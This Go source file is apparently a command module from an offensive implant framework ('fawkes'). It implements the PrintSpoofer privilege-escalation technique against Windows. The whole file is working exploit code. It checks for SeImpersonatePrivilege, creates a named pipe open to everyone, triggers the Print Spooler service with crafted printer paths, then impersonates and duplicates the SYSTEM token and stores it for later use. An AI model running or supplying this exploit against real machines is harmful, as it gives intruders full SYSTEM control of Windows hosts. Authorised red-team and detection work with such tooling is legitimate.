//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PrintSpooferCommand implements the PrintSpoofer privilege escalation technique.
// Exploits SeImpersonatePrivilege by creating a named pipe and triggering the
// Print Spooler service (SYSTEM) to connect to it, then impersonating the token.
// Works from NETWORK SERVICE, LOCAL SERVICE, or any context with SeImpersonate.
type PrintSpooferCommand struct{}

func (c *PrintSpooferCommand) Name() string { return "printspoofer" }
func (c *PrintSpooferCommand) Description() string {
	return "PrintSpoofer privilege escalation — SeImpersonate to SYSTEM via Print Spooler"
}

type printSpooferArgs struct {
	Timeout int `json:"timeout"`
}

var (
	winspoolDrv      = windows.NewLazySystemDLL("winspool.drv")
	procOpenPrinterW = winspoolDrv.NewProc("OpenPrinterW")
	procClosePrinter = winspoolDrv.NewProc("ClosePrinter")
)

func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
	var args printSpooferArgs
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &args)
	}
	if args.Timeout == 0 {
		args.Timeout = 30
	}

	// Check SeImpersonatePrivilege first
	if !checkPrivilege("SeImpersonatePrivilege") {
		return structs.CommandResult{
			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
			Status:    "error",
			Completed: true,
		}
	}

	// Get computer name for the printer path.
	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
	compNameSize := uint32(len(compNameBuf))
	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("GetComputerName failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	computerName := windows.UTF16ToString(compNameBuf[:compNameSize])

	// Also get the DNS hostname (FQDN) for domain-joined machines
	var dnsNameBuf [256]uint16
	dnsNameSize := uint32(len(dnsNameBuf))
	var dnsHostname string
	if windows.GetComputerNameEx(windows.ComputerNameDnsFullyQualified, &dnsNameBuf[0], &dnsNameSize) == nil {
		dnsHostname = windows.UTF16ToString(dnsNameBuf[:dnsNameSize])
	}

	// Generate a random pipe name suffix
	var randBuf [8]byte
	windows.GetSystemTimeAsFileTime((*windows.Filetime)(unsafe.Pointer(&randBuf)))
	pipeSuffix := fmt.Sprintf("ps_%x", randBuf[4:8])

	// Create the named pipe: \\.\pipe\{suffix}\pipe\spoolss
	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)

	// Create security descriptor allowing Everyone to connect
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("NewSecurityDescriptor failed: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SetDACL failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("UTF16 conversion failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build hostname list for triggers.
	// All hostnames should trigger SMB authentication to get SYSTEM.
	hostnames := []string{computerName}
	if dnsHostname != "" && dnsHostname != computerName {
		hostnames = append(hostnames, dnsHostname)
	}
	hostnames = append(hostnames, "127.0.0.1")

	// Fire ALL triggers simultaneously in goroutines.
	// Some may block (SyscallN), others may return quickly.
	var triggerWarnings []string
	perTriggerTimeout := time.Duration(args.Timeout) * time.Second
	for _, host := range hostnames {
		printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
		triggerDone := make(chan error, 1)
		h := host // capture for closure
		go func(name string) {
			triggerDone <- triggerSpooler(name)
		}(printerName)

		// Don't wait for result — fire and forget. Check for quick errors.
		go func(hostName string, done chan error) {
			select {
			case triggerErr := <-done:
				if triggerErr != nil {
					// Just log; we'll collect diagnostics later from the main goroutine
					_ = triggerErr
				}
			case <-time.After(perTriggerTimeout):
				// Timed out — the goroutine is stuck in SyscallN
			}
		}(h, triggerDone)
	}

	// Now accept pipe connections in a loop, checking each for SYSTEM identity.
	// Multiple clients may connect: our own OpenPrinterW calls (yielding our token)
	// or the Spooler service (yielding SYSTEM). We want the Spooler's connection.
	deadline := time.Now().Add(time.Duration(args.Timeout) * time.Second)
	var clientIdentity string
	var dupToken windows.Token
	attempt := 0

	for time.Now().Before(deadline) {
		attempt++
		remaining := time.Until(deadline)
		if remaining <= 0 {
			break
		}

		// Create pipe instance for this attempt
		hPipe, _, createErr := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeNamePtr)),
			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			PIPE_BUFFER_SIZE,
			PIPE_BUFFER_SIZE,
			0,
			uintptr(unsafe.Pointer(&sa)),
		)
		if hPipe == uintptr(windows.InvalidHandle) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CreateNamedPipe failed for %s (attempt %d): %v", pipePath, attempt, createErr),
				Status:    "error",
				Completed: true,
			}
		}
		pipeHandle := windows.Handle(hPipe)

		// Start async ConnectNamedPipe
		event, eventErr := windows.CreateEvent(nil, 1, 0, nil)
		if eventErr != nil {
			windows.CloseHandle(pipeHandle)
			return structs.CommandResult{
				Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
				Status:    "error",
				Completed: true,
			}
		}

		var overlapped windows.Overlapped
		overlapped.HEvent = event

		ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
		if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			return structs.CommandResult{
				Output:    fmt.Sprintf("ConnectNamedPipe failed (attempt %d): %v", attempt, connectErr),
				Status:    "error",
				Completed: true,
			}
		}

		connected := connectErr == windows.ERROR_PIPE_CONNECTED
		if !connected {
			waitMs := uint32(remaining.Milliseconds())
			if waitMs > 5000 {
				waitMs = 5000 // Check every 5 seconds
			}
			waitResult, _ := windows.WaitForSingleObject(event, waitMs)
			if waitResult == windows.WAIT_OBJECT_0 {
				connected = true
			}
		}

		if !connected {
			windows.CancelIoEx(pipeHandle, &overlapped)
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			continue // Try accepting next connection
		}

		// Client connected — lock thread and impersonate to check identity
		runtime.LockOSThread()
		impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
		if impRet == 0 {
			runtime.UnlockOSThread()
			procDisconnectNamedPipe.Call(hPipe)
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			triggerWarnings = append(triggerWarnings, fmt.Sprintf("attempt %d: ImpersonateNamedPipeClient failed: %v", attempt, impErr))
			continue
		}

		identity, _ := GetCurrentIdentity()
		if identity == "" {
			identity = "unknown"
		}

		// Check if this is SYSTEM (the Spooler's token)
		isSystem := strings.Contains(strings.ToUpper(identity), "SYSTEM")

		if !isSystem {
			// Not SYSTEM — this is likely our own process's connection.
			// Revert and disconnect, wait for the next connection.
			procRevertToSelf.Call()
			runtime.UnlockOSThread()
			procDisconnectNamedPipe.Call(hPipe)
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			triggerWarnings = append(triggerWarnings, fmt.Sprintf("attempt %d: connected as %s (not SYSTEM), retrying", attempt, identity))
			continue
		}

		// SYSTEM token! Capture it.
		clientIdentity = identity

		var threadToken windows.Token
		err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
		if err != nil {
			err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
		}
		if err != nil {
			procRevertToSelf.Call()
			runtime.UnlockOSThread()
			procDisconnectNamedPipe.Call(hPipe)
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			return structs.CommandResult{
				Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
				Status:    "error",
				Completed: true,
			}
		}

		err = windows.DuplicateTokenEx(
			threadToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityDelegation,
			windows.TokenPrimary,
			&dupToken,
		)
		if err != nil {
			err = windows.DuplicateTokenEx(
				threadToken,
				windows.MAXIMUM_ALLOWED,
				nil,
				windows.SecurityImpersonation,
				windows.TokenImpersonation,
				&dupToken,
			)
		}
		threadToken.Close()

		if err != nil {
			procRevertToSelf.Call()
			runtime.UnlockOSThread()
			procDisconnectNamedPipe.Call(hPipe)
			windows.CloseHandle(event)
			windows.CloseHandle(pipeHandle)
			return structs.CommandResult{
				Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
				Status:    "error",
				Completed: true,
			}
		}

		// Clean up pipe
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		windows.CloseHandle(event)
		windows.CloseHandle(pipeHandle)

		// Store in global identity system
		if setErr := SetIdentityToken(dupToken); setErr != nil {
			runtime.UnlockOSThread()
			windows.CloseHandle(windows.Handle(dupToken))
			return structs.CommandResult{
				Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
				Status:    "error",
				Completed: true,
			}
		}

		osThreadLocked = true

		var sb strings.Builder
		sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
		sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
		sb.WriteString(fmt.Sprintf("Hostnames tried: %v\n", hostnames))
		sb.WriteString(fmt.Sprintf("Captured identity: %s\n", clientIdentity))
		sb.WriteString(fmt.Sprintf("Attempts: %d\n", attempt))
		sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
		if len(triggerWarnings) > 0 {
			sb.WriteString("\nDiagnostics:\n")
			for _, w := range triggerWarnings {
				sb.WriteString(fmt.Sprintf("  %s\n", w))
			}
		}
		sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
		sb.WriteString("Use 'whoami' to verify current context.\n")

		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "success",
			Completed: true,
		}
	}

	// Timeout — no SYSTEM connection received
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Timeout after %ds — Print Spooler did not connect as SYSTEM to %s.\n", args.Timeout, pipePath))
	sb.WriteString(fmt.Sprintf("Attempts: %d\n", attempt))
	sb.WriteString("Possible causes:\n")
	sb.WriteString("- Print Spooler not running (sc query spooler)\n")
	sb.WriteString("- Technique may be patched on this Windows build\n")
	sb.WriteString("- SMB loopback connections may be blocked\n")
	if len(triggerWarnings) > 0 {
		sb.WriteString("\nDiagnostics:\n")
		for _, w := range triggerWarnings {
			sb.WriteString(fmt.Sprintf("  %s\n", w))
		}
	}
	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "error",
		Completed: true,
	}
}

// triggerSpooler calls OpenPrinterW with a crafted path that causes the
// Print Spooler service to connect to our named pipe as SYSTEM.
// OpenPrinterW errors are returned as diagnostics but are non-fatal —
// the spooler may have already connected to the pipe before returning.
func triggerSpooler(printerName string) error {
	namePtr, err := windows.UTF16PtrFromString(printerName)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	var hPrinter uintptr
	ret, _, callErr := procOpenPrinterW.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(&hPrinter)),
		0, // pDefault = NULL
	)

	// OpenPrinterW may fail with an error (the printer doesn't actually exist),
	// but the important thing is that the spooler TRIED to connect to the pipe.
	// The authentication/connection happens before the error is returned.
	if ret != 0 && hPrinter != 0 {
		procClosePrinter.Call(hPrinter)
	}

	// Return OpenPrinterW errors as diagnostics (caller treats as non-fatal).
	// Expected errors:
	//   1801 = ERROR_INVALID_PRINTER_NAME (printer doesn't exist — expected)
	//   1210 = ERROR_INVALID_COMPUTERNAME (hostname format rejected)
	//   53   = ERROR_BAD_NETPATH (path resolution failed)
	// In all cases the spooler may still have connected to our pipe.
	if ret == 0 && callErr != nil {
		return fmt.Errorf("OpenPrinterW(%s): %v", printerName, callErr)
	}

	return nil
}
